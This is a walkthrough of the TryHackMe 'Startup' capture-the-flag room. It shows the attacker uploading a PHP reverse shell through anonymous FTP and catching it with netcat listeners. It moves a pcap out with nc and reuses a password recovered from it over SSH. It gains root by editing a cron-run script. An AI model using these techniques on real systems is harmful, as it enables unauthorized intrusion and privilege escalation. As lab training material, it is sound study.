# TryHackMe: Startup

## Initial enumeration:

I'll start with a simple port scan.
```bash
rustscan -a 10.10.206.150

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

The HTTP server just has a message about maintenance. So'll check the FTP server next.

It allows "anonymous" access. 
```bash
ls
229 Entering Extended Passive Mode (|||56589|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

The "notice.txt" file mentioned someone named "Maya". The jpg was just a meme. The empty ftp server seemed interesting. I'll try to add a file and see if I can access it via the HTTP server.

I'll also use brute force directories on the server.

```bash
feroxbuster -u http://10.10.206.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt               

200      GET       20l      113w      808c http://10.10.206.150/
301      GET        9l       28w      314c http://10.10.206.150/files => http://10.10.206.150/files/
200      GET      728l     5285w   461820c http://10.10.206.150/files/important.jpg
200      GET        1l       40w      208c http://10.10.206.150/files/notice.txt
200      GET      728l     5285w   461820c http://10.10.206.150/files/ftp/important.jpg
```

## Initial access:

So, if I can put files in the ftp directory. We also know this is an apache server, so it might execute php code. I ll make a file with a simple php reverse shell.

```bash
rlwrap nc -lnvp 6666

curl http://10.10.28.210/files/ftp/rev.php

$ whoami
www-data
```

## Lateral Movement:

Enumerating through the internal files we can see 2 interesting things.
```bash
$ ls
bin
boot
dev
etc
home
incidents           *
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
recipe.txt      *
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
```

We can also see 2 users.
```bash
$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash

lennie:x:1002:1002::/home/lennie:

```

```bash
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

In the incidents folder we can see a pcap file.
```bash
$ cd incidents
$ ls
suspicious.pcapng
```

Transfer the pcapng file:
```bash
nc -lvp 7777 >suspicious.pcap # on my machine

nc $MY_IP 7777 <suspicious.pcap # on the remote host
```

Looking through the pcap file we can see a similar initial access vector and bash command being executed. One of those commands is ```sudo -l``` followed by ```c4ntg3t3n0ughsp1c3```
```c4ntg3t3n0ughsp1c3```

We can use ssh to connect as lennie on the host.
```bash
ssh lennie@10.10.66.199 
c4ntg3t3n0ughsp1c3

whoami
lennie
```

## Privilege Escalation:

In Lennie's home folder we can find a folder called ```scripts``` which contains: 
```bash
planner.sh
startup_list.txt
```

```bash
cat planner.sh 

#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

cat /etc/print.sh

#!/bin/bash
echo "Done!"
```

Checking the ```print.sh``` script reveals we can overwrite it:
```bash
2025/08/24 08:30:01 CMD: UID=0     PID=1713   | /bin/bash /home/lennie/scripts/planner.sh 
2025/08/24 08:30:01 CMD: UID=0     PID=1712   | /bin/sh -c /home/lennie/scripts/planner.sh 
2025/08/24 08:30:01 CMD: UID=0     PID=1711   | /usr/sbin/CRON -f 
```


```bash
lennie@startup:~/Documents$ ls
concern.txt  list.txt  note.txt
lennie@startup:~/Documents$ cat *
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

Shoppinglist: Cyberpunk 2077 | Milk | Dog food

Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
```

Using pspy reveals the existence of a cronjob:
```bash
2025/08/24 08:30:01 CMD: UID=0     PID=1713   | /bin/bash /home/lennie/scripts/planner.sh 
2025/08/24 08:30:01 CMD: UID=0     PID=1712   | /bin/sh -c /home/lennie/scripts/planner.sh 
2025/08/24 08:30:01 CMD: UID=0     PID=1711   | /usr/sbin/CRON -f 
```

So we can change the ```/etc/print.sh``` script so it runs code as root. I'll use this to start a simple reverse shell for that.

```bash
rlwrap nc -lnvp 8888 

whoami
root
```